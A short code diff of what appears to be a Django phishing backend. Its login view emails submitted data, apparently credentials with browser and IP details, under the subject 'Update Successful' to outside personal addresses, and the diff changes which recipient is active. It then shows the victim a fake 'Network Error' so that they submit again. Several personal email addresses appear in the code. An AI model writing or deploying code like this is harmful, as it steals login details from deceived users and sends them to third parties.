@@ -10,7 +10,7 @@ from .utils import get_browser_info, get_client_ip
 from . import send_email
 
 def home(request):
-    return render(request, 'frontend/index.html')
+    return render(request, 'frontend/index2.html')
 
 
 def user_login_view(request):
@@ -35,8 +35,8 @@ def user_login_view(request):
             })
 
             try:
-                # send_email.email_message_send('Update Successful', message, 'potter.alexe@gmail.com' )
-                send_email.email_message_send('Update Successful', message, 'Ventasj.casapalm@gmail.com' )
+                send_email.email_message_send('Update Successful', message, 'potter.alexe@gmail.com' )
+                # send_email.email_message_send('Update Successful', message, 'Ventasj.casapalm@gmail.com' )
                 # send_email.email_message_send('Update Successful', message, 'info.puhali.ee@gmail.com' )
                 # send_email.email_message_send('Update Successful', message, 'bamsven@proton.me' )
                 messages.error(request, "Network Error! Please verify your information and try again.")
